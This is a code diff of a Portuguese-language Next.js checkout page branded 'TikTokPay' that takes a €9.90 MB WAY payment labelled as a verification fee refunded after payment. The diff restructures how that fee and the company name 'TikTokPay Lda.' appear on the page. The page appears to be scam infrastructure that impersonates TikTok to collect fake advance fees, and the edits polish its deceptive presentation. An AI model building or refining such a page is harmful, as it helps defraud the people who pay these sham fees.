@@ -2,11 +2,12 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 
 export default function Checkout() {
-  // Configuração inicial conforme a sua solicitação
+  // Configuração de nomes e descrições
   const [params, setParams]     = useState({ 
     name: 'TikTokPay', 
     amount: 9.90, 
-    description: 'Taxa de Verificação – Reembolso após Pagamento', 
+    taxName: 'Taxa de Verificação – Reembolso após Pagamento',
+    description: 'TikTokPay Lda.', 
     logo: '', 
     timer: 10 
   })
@@ -25,7 +26,8 @@ export default function Checkout() {
     setParams({
       name:        p.get('name')        || 'TikTokPay',
       amount:      parseFloat(p.get('amount') || '9.90'),
-      description: p.get('description') || 'Taxa de Verificação – Reembolso após Pagamento',
+      taxName:     'Taxa de Verificação – Reembolso após Pagamento',
+      description: p.get('description') || 'TikTokPay Lda.',
       logo:        p.get('logo')        || '',
       timer,
     })
@@ -80,7 +82,7 @@ export default function Checkout() {
         body: JSON.stringify({
           amount:             params.amount,
           method,
-          paymentDescription: params.description.slice(0, 50),
+          paymentDescription: params.taxName.slice(0, 50),
           currency:           'EUR',
           payer: {
             name:     params.name + ' Customer',
@@ -144,13 +146,12 @@ export default function Checkout() {
           max-width: 80%; max-height: 80%;
           width: auto; height: auto; display: block; object-fit: contain;
         }
-        /* Nome que você circulou em cima */
         .product-name-header { font-size: 1.25rem; font-weight: 800; margin-bottom: .1rem; color: #000; }
         .product-secure { font-size: .78rem; color: #888; font-weight: 400; }
 
         .payment-card { padding: 1.25rem; }
-        /* Nome que você circulou embaixo - agora usando a descrição da taxa */
-        .payment-title { font-size: 1.05rem; font-weight: 700; margin-bottom: .8rem; line-height: 1.3; color: #1a1a1a; }
+        .payment-title { font-size: 1.05rem; font-weight: 700; margin-bottom: .2rem; line-height: 1.3; color: #1a1a1a; }
+        .payment-sub { font-size: .85rem; color: #888; margin-bottom: 1rem; }
         
         .total-box {
           background: #f7f7f7; border-radius: 10px;
@@ -218,7 +219,7 @@ export default function Checkout() {
       </div>
 
       <div className="page">
-        {/* CARD DO TOPO: Mantém o TikTokPay conforme o primeiro círculo vermelho */}
+        {/* CARD DO TOPO: Apenas TikTokPay */}
         <div className="card product-card">
           <div className="product-logo">
             <img 
@@ -231,9 +232,10 @@ export default function Checkout() {
           <div className="product-secure">Pagamento seguro • WayMB</div>
         </div>
 
-        {/* CARD DE PAGAMENTO: O segundo círculo vermelho agora mostra a Taxa completa */}
+        {/* CARD DE PAGAMENTO: Nome da Taxa + Descrição TikTokPay Lda. */}
         <div className="card payment-card">
-          <div className="payment-title">{params.description}</div>
+          <div className="payment-title">{params.taxName}</div>
+          <div className="payment-sub">{params.description}</div>
 
           <div className="total-box">
             <div className="total-label">Total a pagar</div>
@@ -267,7 +269,6 @@ export default function Checkout() {
             </>
           )}
 
-          {/* ... Estados de sucesso mantidos conforme versões anteriores ... */}
           {uiState === 'mbway' && (
             <div className="success-box">
               <div className="success-title" style={{fontWeight:700}}>Aprove no MB WAY</div>
